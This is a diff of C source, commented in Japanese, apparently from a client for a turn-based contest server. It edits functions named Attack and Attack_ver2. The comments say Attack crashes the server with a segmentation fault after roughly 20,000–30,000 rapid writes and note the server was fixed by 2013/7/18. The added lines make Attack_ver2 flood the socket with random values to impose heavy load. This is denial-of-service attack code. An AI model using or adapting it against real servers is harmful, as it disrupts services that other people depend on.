@@ -150,6 +150,7 @@ void Attack (const int fd) {
     サーバーを落とすための関数。
     連続で複数回writeすることでsegmentation faultを引き起こす
     平均20000~30000回のwriteで落ちる模様
+    なお、2013/7/18時点でサーバー対応済み
     */
 
     uint32_t tmp;
@@ -167,14 +168,13 @@ void Attack (const int fd) {
 
 }
 
-uint32_t randomHash() {
-    int d = UINT32_MAX / RAND_MAX;
-    int m = UINT32_MAX % RAND_MAX + 1;
-    uint32_t number = (uint32_t)(rand()*d + rand()%m);
-    return number;
-}
-
 void Attack_ver2(const int fd) {
+    /*
+    サーバーを落とすのではなく、高負荷をかけるための関数。
+    目的がサーバーのsegmentation faultではないので、
+    readも同時に行う。
+    毎ターン自分のリクエストが終わった時点で使用することを想定。
+    */
 
     int len = -1;
     int total_read = 0;
@@ -183,6 +183,16 @@ void Attack_ver2(const int fd) {
     uint32_t buf[22];
 
     while (1) {
+
+        for (int i = 0; i < DATA_NUM; i++) {
+          len = -1;
+          tmp = randomHash();
+          while (len == -1) {
+            len = write(fd, &tmp, sizeof(tmp));
+          }
+          printf("%d th time: Attacking %d byte\n", i, len);
+        }
+
         for (int i = 0; i < DATA_NUM; i++) {
             len = -1;
             while (len <= 0) {
@@ -206,4 +216,11 @@ void Attack_ver2(const int fd) {
         }
     }
 
+}
+
+uint32_t randomHash() {
+    int d = UINT32_MAX / RAND_MAX;
+    int m = UINT32_MAX % RAND_MAX + 1;
+    uint32_t number = (uint32_t)(rand()*d + rand()%m);
+    return number;
 }
